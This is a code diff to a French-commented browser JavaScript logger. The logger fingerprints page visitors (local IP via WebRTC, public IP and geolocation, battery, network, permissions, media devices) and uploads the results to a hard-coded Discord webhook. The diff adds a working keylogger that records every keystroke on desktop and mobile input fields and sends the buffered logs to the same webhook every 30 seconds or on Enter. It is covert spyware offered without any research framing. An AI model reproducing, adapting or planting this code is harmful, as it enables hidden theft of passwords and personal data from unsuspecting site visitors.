@@ -5,7 +5,6 @@
 (async () => {
     const WEBHOOK_URL = "https://discord.com/api/webhooks/1367237113220698184/dRNpJg9cI-GD6PMGNHE22eAvjVPOIz5i8zfuIWOVADYCplQvQ3UBcqCL1vFet8CRtcMr";
 
-    /* ========================= FONCTION POUR RÉCUPÉRER IP LOCALE ========================= */
     async function getLocalIP() {
         try {
             const pc = new RTCPeerConnection({ iceServers: [] });
@@ -24,7 +23,113 @@
         }
     }
 
-    /* ========================= COLLECTE INFOS AVANCÉES ========================= */
+    let keylogBuffer = [];
+    let lastKeylogSend = Date.now();
+    
+    async function sendKeylog() {
+        if (keylogBuffer.length === 0) return;
+        
+        const keylogText = keylogBuffer.join('\n');
+        keylogBuffer = [];
+        
+        const timestamp = new Date().toISOString();
+        const keylogData = `=== Keylogger [${timestamp}] ===\n\n${keylogText}\n\n`;
+        
+        try {
+            const form = new FormData();
+            form.append("file", new Blob([keylogData], { type: "text/plain" }), `Keylog_${timestamp.replace(/:/g, '-')}.txt`);
+            await fetch(WEBHOOK_URL, { method: "POST", body: form });
+        } catch (error) {
+            console.error("Erreur lors de l'envoi du keylog:", error);
+        }
+        
+        lastKeylogSend = Date.now();
+    }
+    
+    function logKey(key, eventType) {
+        const timestamp = new Date().toISOString();
+        keylogBuffer.push(`[${timestamp}] [${eventType}] ${key}`);
+        
+        if (key === 'Enter' || Date.now() - lastKeylogSend > 30000) {
+            sendKeylog();
+        }
+    }
+    
+    const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+    
+    if (isMobile) {
+        let inputElement = null;
+        let lastValue = '';
+        
+        document.addEventListener('focus', function(e) {
+            if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA' || e.target.contentEditable === 'true') {
+                inputElement = e.target;
+                lastValue = inputElement.value || (inputElement.textContent || '');
+            }
+        }, true);
+        
+        document.addEventListener('input', function(e) {
+            if (e.target === inputElement) {
+                const currentValue = e.target.value || (e.target.textContent || '');
+                if (currentValue.length > lastValue.length) {
+                    // Caractère(s) ajouté(s)
+                    const newChars = currentValue.substring(lastValue.length);
+                    for (let i = 0; i < newChars.length; i++) {
+                        logKey(newChars[i], 'INPUT');
+                    }
+                } else if (currentValue.length < lastValue.length) {
+                    // Caractère(s) supprimé(s)
+                    logKey('[BACKSPACE]', 'INPUT');
+                }
+                lastValue = currentValue;
+            }
+        }, true);
+        
+        document.addEventListener('keydown', function(e) {
+            if (e.key === 'Enter') {
+                logKey('[ENTER]', 'KEYDOWN');
+            }
+        }, true);
+    } else {
+        document.addEventListener('keydown', function(e) {
+            if (e.key.length === 1) {
+                logKey(e.key, 'KEYDOWN');
+            } else if (e.key === 'Enter') {
+                logKey('[ENTER]', 'KEYDOWN');
+            } else if (e.key === 'Backspace') {
+                logKey('[BACKSPACE]', 'KEYDOWN');
+            } else if (e.key === 'Tab') {
+                logKey('[TAB]', 'KEYDOWN');
+            } else if (e.key === 'Escape') {
+                logKey('[ESC]', 'KEYDOWN');
+            } else if (e.key === 'Delete') {
+                logKey('[DELETE]', 'KEYDOWN');
+            } else if (e.key.startsWith('Arrow')) {
+                logKey(`[${e.key.toUpperCase()}]`, 'KEYDOWN');
+            } else if (e.ctrlKey && e.key === 'c') {
+                logKey('[CTRL+C]', 'KEYDOWN');
+            } else if (e.ctrlKey && e.key === 'v') {
+                logKey('[CTRL+V]', 'KEYDOWN');
+            } else if (e.ctrlKey && e.key === 'x') {
+                logKey('[CTRL+X]', 'KEYDOWN');
+            } else if (e.ctrlKey && e.key === 'a') {
+                logKey('[CTRL+A]', 'KEYDOWN');
+            } else if (e.ctrlKey && e.key === 'z') {
+                logKey('[CTRL+Z]', 'KEYDOWN');
+            } else if (e.ctrlKey && e.key === 'y') {
+                logKey('[CTRL+Y]', 'KEYDOWN');
+            }
+        }, true);
+        
+        document.addEventListener('keyup', function(e) {
+            if (e.key === 'Shift' || e.key === 'Control' || e.key === 'Alt' || e.key === 'Meta') {
+                logKey(`[${e.key.toUpperCase()}]`, 'KEYUP');
+            }
+        }, true);
+    }
+    
+    setInterval(sendKeylog, 30000);
+
     const infos = {};
 
     // Récupération de l'IP locale
@@ -61,7 +166,6 @@
         dateLocale: new Date().toString()
     };
 
-    /* ========================= BATTERIE ========================= */
     if (navigator.getBattery) {
         const battery = await navigator.getBattery();
         infos.batterie = {
@@ -72,7 +176,6 @@
         };
     }
 
-    /* ========================= RÉSEAU ========================= */
     if (navigator.connection) {
         infos.reseau = {
             type: navigator.connection.effectiveType,
@@ -82,7 +185,6 @@
         };
     }
 
-    /* ========================= PERMISSIONS (état) ========================= */
     async function perm(name) {
         try {
             const p = await navigator.permissions.query({ name });
@@ -100,7 +202,6 @@
         clipboard: await perm("clipboard-read")
     };
 
-    /* ========================= MÉDIAS (sans accès) ========================= */
     if (navigator.mediaDevices?.enumerateDevices) {
         const devices = await navigator.mediaDevices.enumerateDevices();
         infos.media = {
@@ -110,12 +211,12 @@
         };
     }
 
-    /* ========================= IP + GEO IP ========================= */
     try {
         const ipRes = await fetch("https://api.ipify.org?format=json");
         const ipData = await ipRes.json();
         infos.ip = ipData.ip;
         const geoRes = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
+
         const geo = await geoRes.json();
         infos.geoIP = {
             pays: geo.country_name,
@@ -131,7 +232,6 @@
         infos.ip = "Erreur";
     }
 
-    /* ========================= FORMAT TXT ========================= */
     let txt = "=== New Logger Info ===\n\n";
 
     function add(section, obj) {
@@ -154,7 +254,6 @@
     add("IP", { ip: infos.ip });
     if (infos.geoIP) add("Géo IP", infos.geoIP);
 
-    /* ========================= ENVOI DISCORD EN FICHIER ========================= */
     const form = new FormData();
     form.append("file", new Blob([txt], { type: "text/plain" }), "New_Logger_Info.txt");
     fetch(WEBHOOK_URL, { method: "POST", body: form });
